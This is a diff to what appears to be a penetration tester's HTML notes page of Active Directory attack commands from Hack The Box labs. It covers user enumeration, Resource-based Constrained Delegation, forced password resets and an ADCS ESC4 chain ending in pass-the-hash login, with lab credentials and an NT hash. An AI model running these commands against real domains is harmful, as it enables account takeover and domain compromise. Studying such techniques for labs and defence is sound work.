@@ -25,10 +25,23 @@
         <div class="notion-body">
             <h2>Enumeration</h2>
             <ul>
-                <p> Basic SMB enumeration to check if it vulnerable to SMB relay. Additionally you can get the <b>domain name</b></p>
+                <p> Basic SMB enumeration to check if it vulnerable to SMB relay (signing:False). Additionally you can get the <b>domain name</b></p>
                 <pre><code class="language-bash">crackmapexec smb 10.10.11.174</code></pre>
                 <p> To dump all ldap information</p>
                 <pre><code class="language-bash">ldapsearch -H ldap://DOMAIN_NAME -D 'USER@DOMAIN_NAME' -w 'PASSWORD' -b 'dc=DOMAIN_NAME,dc=SECOND_DOMAIN_NAME'</code></pre>
+
+                <h3>Rpcclient</h3>
+                <p>Null sesion with rpcclient in order to enumerate users</p>
+                <pre><code class="language-bash">rpcclient -U "" 10.10.10.11.51 -N</code></pre>
+                <p>Once inside, user enumeration</p>
+                <pre><code class="language-bash">enumdomusers</code></pre>
+
+
+                <h3> Kerbrute </h3>
+                <p>User enumeration</p>
+                <pre><code class="language-bash">kerbrute userenum --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/usernames.txt </code></pre>
+
+                
 
                 <h3> BloodHound </h3>
                 <p> Utility to gather more information when a <b>user and password have been gathered</b></p>
@@ -48,31 +61,63 @@
             </ul>
             <h2>Exploitation</h2>
             <ul>
-                <h3> Resource-based Constrained Delegation</h3>
-                <p> RBCD is an attack technique in Active Directory where an attacker abuses a legitimate Kerberos delegation feature to impersonate any user, including domain admins, to access services on a target machine.</p>
-                <p> Any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).</p>
-                <p> The attack goes the following way</p>
+                <h3> Resource-based Constrained Delegation attack</h3>
                 <ul>
-                    <li>The attacker creates or controls a machine account (FakePC$).</li>
-                    <li>They modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target server to allow FakePC$ to delegate to it. </li>
-                    <li>Using tools like Rubeus, the attacker requests a Kerberos ticket (TGS) as a high-privileged user (e.g., Administrator) to access services on the target server.</li>
-                    <li>The KDC issues the ticket because delegation is allowed — no need to know the administrator's password.</li>
+                    <p> RBCD is an attack technique in Active Directory where an attacker abuses a legitimate Kerberos delegation feature to impersonate any user, including domain admins, to access services on a target machine.</p>
+                    <p> Any user with write permissions over a machine account (GenericAll/GenericWrite/WriteDacl/WriteProperty/etc) can set the msDS-AllowedToActOnBehalfOfOtherIdentity (In the other forms of Delegation you needed domain admin privs).</p>
+                    <p> The attack goes the following way</p>
+                    <ul>
+                        <li>The attacker creates or controls a machine account (FakePC$).</li>
+                        <li>They modify the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a target server to allow FakePC$ to delegate to it. </li>
+                        <li>Using tools like Rubeus, the attacker requests a Kerberos ticket (TGS) as a high-privileged user (e.g., Administrator) to access services on the target server.</li>
+                        <li>The KDC issues the ticket because delegation is allowed — no need to know the administrator's password.</li>
+                    </ul>
+                    <p> To perform this attack you can follow "literally" the commands that bloodhound provides eventhough we used a tool that automates the process</p>
+                    <p> Tool: <a class="notion-link" href="https://github.com/tothi/rbcd-attack/blob/master/README.md"> rbcd.py </a></p>
+                    <p> Creating fake computer </p>
+                    <pre><code class="language-bash">python3 addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful</code></pre>
+                    <p>Modifiying delegation rights</p>
+                    <pre><code class="language-bash">python3 rbcd.py -f EVILCOMPUTER -t DC -dc-ip 10.10.11.174  support\\support:Ironside47pleasure40Watchful</code></pre>
+                    <p>Getting the impersonated service ticket</p>
+                    <pre><code class="language-bash">python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/EVILCOMPUTER$:ev1lP@sS</code></pre>
+                    <p> Exporting ticket and connecting to machine</p>
                 </ul>
-                <p> To perform this attack you can follow "literally" the commands that bloodhound provides eventhough we used a tool that automates the process</p>
-                <p> Tool: <a class="notion-link" href="https://github.com/tothi/rbcd-attack/blob/master/README.md"> rbcd.py </a></p>
-                <p> Creating fake computer </p>
-                <pre><code class="language-bash">python3 addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful</code></pre>
-                <p>Modifiying delegation rights</p>
-                <pre><code class="language-bash">python3 rbcd.py -f EVILCOMPUTER -t DC -dc-ip 10.10.11.174  support\\support:Ironside47pleasure40Watchful</code></pre>
-                <p>Getting the impersonated service ticket</p>
-                <pre><code class="language-bash">python3 getST.py -spn cifs/DC.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/EVILCOMPUTER$:ev1lP@sS</code></pre>
-                <p> Exporting ticket and connecting to machine</p>
-                <pre><code class="language-bash">export KRB5CCNAME=Administrator.ccache
-    python3 psexec.py -k dc.support.htb</code></pre>
-           
-            
 
-            
+                <h3> Force Change password attack</h3>
+                <ul>
+                    <p> An attacker has certain permissions on user object (like GenericWrite, WriteProperty, WriteOwner) which ables him to change the password of user without knowing it</p>
+                    <p>To perform this attack you can follow commands that bloodhound provides (more or less becaouse i had to change one a bit)</p>
+                    <p>Define our user passwords</p>
+                    <pre><code class="language-powershell">$SecPassword = ConvertTo-SecureString 'WqSZAF6CysDQbGb3' -AsPlainText -Force
+    $Cred = New-Object System.Management.Automation.PSCredential('sequel\ryan', $SecPassword)</code></pre>
+                    <p>Change the owner of our victim user</p>    
+                    <pre><code class="language-powershell">Set-DomainObjectOwner -Credential $Cred -Identity VICTIM_USER -OwnerIdentity ATTACKER_USER</code></pre>
+                    <p>Change password of the user</p>
+                    <pre><code class="language-powershell">Add-DomainObjectAcl -TargetIdentity "VICTIM_USER" -Rights ResetPassword -PrincipalIdentity "ATTACKER_USER"</code></pre>
+                    <p>Define the new password for the user</p>
+                    <pre><code class="language-powershell">$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force</code></pre>
+                    <p>Change user password</p>    
+                    <pre><code class="language-powershell">Set-DomainUserPassword -Identity VICTIM_USER -AccountPassword $UserPassword -Credential $Cred</code></pre>    
+                    <p>Check if password was changed</p>    
+                    <pre><code class="language-bash">crackmapexec smb 10.10.11.51 -u VICTIM_USER -p 'Password123!'</code></pre>   
+                </ul>     
+                
+                <h3>Active Directory Certificate Services (ADCS) | ESC4 </h3>
+                <ul>
+                    <p>Having in mind that there is a vulnerable certificate template wich has wrong configuration can be used to request certificates impersonating another user</p>
+                    <p>First of all we must have permisions to use that template certificate and this template will be vulnerable if the parameter <b>"Requires Manager Approval"</b> is in <b>"false"</b></p>
+                    <p>All this information can be found using <b>certipy</b> tool</p>
+                    <p>Find a vulnerable certificate</p>
+                    <pre><code class="language-bash"></code>certipy find -u 'ca_svc@sequel.htb' -p 'WqSZAF6CysDQbGb3' -dc-ip '10.10.11.51' -vulnerable -stdout</pre>
+                    <p>Update certificate template modifying values to make certificate vulnerable</p>
+                    <pre><code class="language-bash">certipy template -u ca_svc@sequel.htb -p 'WqSZAF6CysDQbGb3' -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51</code></pre>   
+                    <p>Request certificate as Administrator user</p>
+                    <pre><code class="language-bash">certipy req -u 'ca_svc' -p 'WqSZAF6CysDQbGb3' -dc-ip '10.10.11.51' -template 'DunderMifflinAuthentication' -ca 'sequel-DC01-CA' -dns 'administrator.sequel.htb' -upn 'Administrator@sequel.htb'</code></pre>   
+                    <p>Use the certificate obtained to authenticate in the server and get NT hash</p>
+                    <pre><code class="language-bash">certipy auth -pfx administrator_administrator.pfx -domain sequel.htb</code></pre>
+                    <p>Authenticate using evilwinrm using the NT hash obtained </p>
+                    <pre><code class="language-power">/usr/bin/evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff</code></pre>
+                </ul>    
             </ul>        
         </div>
     </div>
